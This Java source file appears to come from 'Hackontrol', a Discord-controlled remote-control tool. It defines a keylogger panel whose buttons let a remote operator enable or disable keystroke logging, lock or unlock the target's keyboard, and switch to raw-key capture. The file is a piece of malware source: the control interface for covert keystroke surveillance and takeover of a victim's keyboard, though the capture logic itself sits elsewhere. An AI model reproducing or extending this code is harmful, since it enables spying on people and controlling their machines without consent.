package com.khopan.hackontrol.panel;

import com.khopan.hackontrol.KeyboardHandler;
import com.khopan.hackontrol.registry.Registration;
import com.khopan.hackontrol.service.interaction.ButtonManager;
import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.service.interaction.context.ButtonContext;
import com.khopan.hackontrol.utils.HackontrolMessage;

import net.dv8tion.jda.api.interactions.components.buttons.Button;

public class KeyLoggerPanel extends Panel {
	private static final String PANEL_NAME = "keylogger";

	private static final Button BUTTON_ENABLE          = ButtonManager.staticButton(ButtonType.SUCCESS, "Enable",  "keyloggerEnable");
	private static final Button BUTTON_DISABLE         = ButtonManager.staticButton(ButtonType.DANGER,  "Disable", "keyloggerDisable");
	private static final Button BUTTON_LOCK            = ButtonManager.staticButton(ButtonType.SUCCESS, "Lock",    "keyloggerLock");
	private static final Button BUTTON_UNLOCK          = ButtonManager.staticButton(ButtonType.DANGER,  "Unlock",  "keyloggerUnlock");

	private static final Button BUTTON_RAW_KEY_ENABLE  = ButtonManager.staticButton(ButtonType.SUCCESS, "Enable",  "keyloggerRawKeyEnable");
	private static final Button BUTTON_RAW_KEY_DISABLE = ButtonManager.staticButton(ButtonType.DANGER,  "Disable", "keyloggerRawKeyDisable");

	@Override
	public String panelName() {
		return KeyLoggerPanel.PANEL_NAME;
	}

	@Override
	public void registeration() {
		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_ENABLE,          context -> this.action(context, "KeyLogger is already enabled",    KeyboardHandler.Enable,      () -> KeyboardHandler.Enable = true));
		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_DISABLE,         context -> this.action(context, "KeyLogger is already disabled",   !KeyboardHandler.Enable,     () -> KeyboardHandler.Enable = false));
		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_LOCK,            context -> this.action(context, "Keyboard is already locked",      KeyboardHandler.Block,       () -> KeyboardHandler.Block = true));
		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_UNLOCK,          context -> this.action(context, "Keyboard is already unlocked",    !KeyboardHandler.Block,      () -> KeyboardHandler.Block = false));
		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_RAW_KEY_ENABLE,  context -> this.action(context, "Raw-key mode is already enabled", KeyboardHandler.RawKeyMode,  () -> KeyboardHandler.RawKeyMode = true));
		this.register(Registration.BUTTON, KeyLoggerPanel.BUTTON_RAW_KEY_DISABLE, context -> this.action(context, "Text mode is already enabled",    !KeyboardHandler.RawKeyMode, () -> KeyboardHandler.RawKeyMode = false));
	}

	@Override
	public ControlWidget[] controlWidget() {
		return new ControlWidget[] {
				ControlWidget.newBuilder()
				.text("**KeyLogger**")
				.actionRow(KeyLoggerPanel.BUTTON_ENABLE, KeyLoggerPanel.BUTTON_DISABLE)
				.actionRow(KeyLoggerPanel.BUTTON_LOCK, KeyLoggerPanel.BUTTON_UNLOCK)
				.build(),
				ControlWidget.newBuilder()
				.text("**Raw-Key Mode**")
				.actionRow(KeyLoggerPanel.BUTTON_RAW_KEY_ENABLE, KeyLoggerPanel.BUTTON_RAW_KEY_DISABLE)
				.build()
		};
	}

	private void action(ButtonContext context, String text, boolean already, Runnable setter) {
		if(already) {
			HackontrolMessage.boldDeletable(context.reply(), text);
			return;
		}

		setter.run();
		context.deferEdit().queue();
	}
}
